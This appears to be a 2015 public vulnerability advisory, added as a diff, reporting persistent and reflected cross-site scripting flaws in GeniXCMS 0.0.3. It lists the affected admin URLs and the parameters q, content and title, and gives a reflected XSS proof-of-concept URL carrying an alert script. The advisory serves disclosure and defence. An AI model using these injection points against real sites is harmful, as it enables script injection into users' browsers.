@@ -1,0 +1,95 @@
+# Exploit Title:  Persistent XSS
+# Google Dork: intitle: Persistent XSS
+# Date: 2015-06-21
+# Exploit Author:  John Page ( hyp3rlinx )
+# Website: hyp3rlinx.altervista.org
+# Vendor Homepage: genixcms.org
+# Software Link: genixcms.org
+# Version: 0.0.3
+# Tested on: windows 7
+# Category: webapps
+
+
+Vendor:
+=============================================
+genixcms.org
+
+
+
+Product:
+=====================================================
+GeniXCMS v0.0.3 is a PHP based content management system
+
+
+
+Advisory Information:
+===================================================
+Multiple persistent & reflected XSS vulnerabilities
+
+
+
+Vulnerability Details:
+=========================================================
+GeniXCMS v0.0.3 is vulnerable to persistent and reflected XSS 
+
+
+XSS Exploit code(s):
+====================
+
+Persistent XSS:
+-----------------------
+http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&act=add&token=
+
+1-content input field
+content injected XSS will execute after posting is published
+
+2-title input field
+title injected XSS will execute immediate.
+
+
+Relected XSS:
+---------------------
+http://localhost/GeniXCMS-master/GeniXCMS-master/gxadmin/index.php?page=posts&q=1'<script>alert('XSS By Hyp3rlinx')</script>
+
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: NA
+June 21, 2015 : Public Disclosure
+
+
+
+Severity Level:
+=========================================================
+Med
+
+
+
+Description:
+=========================================================
+
+Request Method(s):         [+] GET & POST 
+
+
+Vulnerable Product:        [+] GeniXCMS 0.0.3 
+
+
+Vulnerable Parameter(s):   [+] q, content & title
+                       
+
+Affected Area(s):          [+] index.php
+                                                       
+
+===============================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory, provided that
+it is not altered except by reformatting it, and that due credit is given. Permission is
+explicitly given for insertion in vulnerability databases and similar, provided that
+due credit is given to the author. The author is not responsible for any misuse of the
+information contained herein and prohibits any malicious use of all security related
+information or exploits by the author or elsewhere.
+
+
+(hyp3rlinx)
